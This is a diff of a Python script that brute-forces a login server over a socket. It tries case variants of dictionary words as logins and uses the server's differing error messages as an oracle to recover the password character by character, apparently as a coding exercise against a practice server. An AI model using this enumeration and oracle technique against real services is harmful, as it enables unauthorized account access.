@@ -2,7 +2,6 @@ import socket
 import json
 from cmdline import get_cmdline_args
 from login_pwd_data import (ALL_ELEMENTS_STR,
-                            verify_creds_crack,
                             gen_case_combos_for_word,
                             get_user_login_data,
                             )
@@ -11,53 +10,32 @@ from socket_conn import socket_operation
 
 def check_creds(socket_conn: socket, creds_data: list[str], creds_type: str) -> str | None:
     for val in creds_data:
-        if val.isalpha():
-            val_combos = gen_case_combos_for_word(val)
-            for val_combo in val_combos:
+        val_combos = gen_case_combos_for_word(val)
+        for val_combo in val_combos:
+            if creds_type == "login":
                 cracked_creds[creds_type] = val_combo
-                response = socket_operation(socket_connection=socket_conn,
-                                            msg_to_send=json.dumps(cracked_creds))
-                # if creds_type == "login":
-                #     cracked_creds[creds_type] = val_combo
-                #     response = socket_operation(socket_connection=socket_conn,
-                #                                 msg_to_send=json.dumps(cracked_creds))
-
-                # login found
+            response = socket_operation(socket_connection=socket_conn,
+                                        msg_to_send=json.dumps(cracked_creds))
+            if creds_type == "login":
                 if json.loads(response)["result"] == "Wrong password!":
                     return val_combo
 
+                elif json.loads(response)["result"] == "Wrong login!":
+                    continue
+
+            elif creds_type == "password":
+                if json.loads(response)["result"] == "Wrong password!":
+                    continue
+
                 elif json.loads(response)["result"] == "Exception happened during login":
                     pwd_chars.append(val_combo)
-                    return
-                # elif creds_type == "password":
-                #     cracked_creds[creds_type] = val_combo
-                #     response = socket_operation(socket_connection=socket_conn,
-                #                                 msg_to_send=json.dumps(cracked_creds))
-                #     if json.loads(response)["result"] == "Exception happened during login":
-                #         pwd_chars.append(val_combo)
-                #         check_creds(socket_conn=socket_conn,
-                #                     creds_data=ALL_ELEMENTS_STR,
-                #                     creds_type="password")
+                    continue
 
-                # both match - cracked
                 elif json.loads(response)["result"] == "Connection success!":
                     return val_combo
 
-        cracked_creds[creds_type] = val
-        response = socket_operation(socket_connection=socket_conn,
-                                    msg_to_send=json.dumps(cracked_creds))
-
-        # login found
-        if json.loads(response)["result"] == "Wrong password!":
-            return val
-
-        elif json.loads(response)["result"] == "Exception happened during login":
-            pwd_chars.append(val)
-            return
-
-        # both match - cracked
-        elif json.loads(response)["result"] == "Connection success!":
-            return val
+                elif json.loads(response)["result"] == "Bad request!":
+                    continue
 
 
 def main():
